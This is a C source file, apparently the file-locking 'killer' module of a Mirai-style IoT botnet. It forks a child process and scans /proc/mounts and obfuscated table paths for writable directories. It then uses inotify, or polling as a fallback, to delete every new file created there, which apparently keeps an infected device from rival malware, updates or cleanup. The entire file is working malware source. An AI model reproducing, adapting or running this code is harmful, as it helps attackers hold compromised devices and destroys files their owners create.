#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/inotify.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dirent.h>
#include <string.h>
#include <signal.h>
#include <sys/prctl.h>
#include <time.h>
#include <sys/socket.h>
#include <stdbool.h>
#include <ctype.h>
#include <netinet/in.h>

#include "headers/util.h"
#include "headers/table.h"
#include "headers/resolve.h"


#define max_path_len 1024
#define max_filename_len 1024

char *writeableDirs[max_path_len];
size_t numWriteable = 0;
char buffer[4096];
struct inotify_event *event;
char filepath[max_path_len];
char line[1024];  // Adjust the buffer size as needed
char fsType[256];
char mountPoint[256];
char options[256];
char self_path[max_path_len];
int len;

int check_for_write(const char *dir) {
    char cleanedDir[max_path_len];

    if (dir[0] == '/' && dir[1] == '/') {
        // Remove one of the leading slashes
        snprintf(cleanedDir, sizeof(cleanedDir), "%s", dir + 1);
    } else if (dir[0] == '/' && dir[1] != '\0') {
        // Remove the extra leading slash
        snprintf(cleanedDir, sizeof(cleanedDir), "%s", dir);
    } else {
        snprintf(cleanedDir, sizeof(cleanedDir), "/%s", dir);
    }

    for (size_t i = 0; i < numWriteable; ++i) {
        if (strcmp(writeableDirs[i], cleanedDir) == 0) {
            // Duplicate found
            return 0;
        }
    }

    if (access(cleanedDir, W_OK) == 0) {
        #ifdef DEBUG
        printf("Found writable dir: \"%s\"\n", cleanedDir);
        #endif

        if (numWriteable < 512) {
            writeableDirs[numWriteable++] = strdup(cleanedDir);
        }
        return 1;
    } else {
        DIR *dp = opendir(cleanedDir);
        if (dp != NULL) {
            struct dirent *entry;
            while ((entry = readdir(dp)) != NULL) {
                if (entry->d_type == DT_DIR && strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                    char subDir[max_path_len];
                    snprintf(subDir, sizeof(subDir), "%s/%s", cleanedDir, entry->d_name);
                    check_for_write(subDir);
                }
            }
            closedir(dp);
            return 1;
        } else {
            return 0;
        }
    }
}

void initOpendir() {
    time_t startTime = time(NULL);

    while (1) {
        for (size_t i = 0; i < numWriteable; ++i) {
            DIR *dp = opendir(writeableDirs[i]);
            if (dp != NULL) {
                struct dirent *entry;
                while ((entry = readdir(dp)) != NULL) {
                    char filepath[max_filename_len];
                    snprintf(filepath, sizeof(filepath), "%s/%s", writeableDirs[i], entry->d_name);

                    // Use stat to get file information
                    struct stat fileStat;
                    if (stat(filepath, &fileStat) == 0) {
                        // Check if the entry is a regular file or directory
                        if (entry->d_type == DT_REG || entry->d_type == DT_DIR) {
                            // Check if the file or directory was modified/created after startTime
                            if (fileStat.st_mtime > startTime) {
                                if (entry->d_type == DT_REG) {
                                    // Delete regular files
                                    if (remove(filepath) == 0) {
                                        #ifdef DEBUG
                                        printf("Deleted new file: %s\n", filepath);
                                        #endif
                                    }
                                } else if (entry->d_type == DT_DIR) {
                                    // Delete directories and their contents
                                    // Note: This recursively deletes the directory and its contents
                                    // You may want to add additional checks or handle this differently
                                    if (remove(filepath) == 0) {
                                        #ifdef DEBUG
                                        printf("Deleted new directory: %s\n", filepath);
                                        #endif
                                    }
                                }
                            }
                        }
                    }
                }
                closedir(dp);
            }
        }
        usleep(2000);
    }
}

void processInotifyEvents(int inotifyFd) {
    fd_set rfds;
    struct timeval tv;
    int retval;

    while (1) {
        FD_ZERO(&rfds);
        FD_SET(inotifyFd, &rfds);

        tv.tv_sec = 5;  // Set the timeout to 5 seconds
        tv.tv_usec = 0;

        retval = select(inotifyFd + 1, &rfds, NULL, NULL, &tv);

        if (retval == -1) {
            return;
        } else if (retval) {
            ssize_t bytesRead = read(inotifyFd, buffer, sizeof(buffer));

            if (bytesRead == -1) {
                return;
            }

            char *ptr = buffer;
            char *end = buffer + bytesRead;

            while (ptr < end) {
                struct inotify_event *event = (struct inotify_event *)ptr;

                if (ptr + sizeof(struct inotify_event) + event->len <= end) {
                    // Ensure that the event fits within the buffer
                    if (event->mask & IN_CREATE) {
                        // Delete the new file in each writable directory
                        for (size_t i = 0; i < numWriteable; ++i) {
                            snprintf(filepath, sizeof(filepath), "%s/%s", writeableDirs[i], event->name);
                            if (remove(filepath) == 0) {
                                #ifdef DEBUG
                                printf("Deleted new file: %s\n", filepath);
                                #endif 
                            } 
                        }
                    }

                    ptr += sizeof(struct inotify_event) + event->len;
                } else {
                    // Handle incomplete or corrupted event
                    break;
                }
            }
        } 
    }
}

int LockerInit() {
    
        int inotifyFd = inotify_init();
        if (inotifyFd == -1) {
            #ifdef DEBUG
            printf("Failed to start locker using Inotify, falling back to opendir.\n");
            #endif
            initOpendir();
        }
        for (size_t i = 0; i < numWriteable; ++i) {
            inotify_add_watch(inotifyFd, writeableDirs[i], IN_CREATE);
            
        }
        #ifdef DEBUG
        printf("Locker started in Inotify mode.\n");
        #endif
        processInotifyEvents(inotifyFd);
        
}

int check_write(const char *path) {
    
    if (access(path, W_OK) == 0) {
        return 1;
    }

    return 0;
    
}
        
void read_mounts() {

    FILE *file = fopen("/proc/mounts", "r");
    if (file == NULL) {
        return;
    }

    #ifdef DEBUG
    printf("Reading from /proc/mounts\n");
    #endif
    while (fgets(line, sizeof(line), file) != NULL) {
        if (sscanf(line, "%255s %255s %*s %255[^\n]", fsType, mountPoint, options) == 3) {
            // Check if fsType contains "fs" and options contain "rw"
            if (strstr(fsType, "fs") != NULL && strstr(options, "rw") != NULL) {
                check_for_write(mountPoint);
            }
        }
    }

    fclose(file);
}

void killer_init(void) {
    if (!fork()){
        prctl(PR_SET_PDEATHSIG, SIGHUP);
        read_mounts();
        
        const char *dirs[] = {
            enc[TABLE_WRITEPATH].string,
            enc[TABLE_WRITEPATH1].string,
            enc[TABLE_WRITEPATH2].string,
            enc[TABLE_WRITEPATH3].string,
            enc[TABLE_WRITEPATH4].string,
            enc[TABLE_WRITEPATH5].string
        };

        size_t numDirs = sizeof(dirs) / sizeof(dirs[0]);

        for (size_t i = 0; i < numDirs; ++i) {
            check_for_write(dirs[i]);
        }

        LockerInit();
    
    }
}
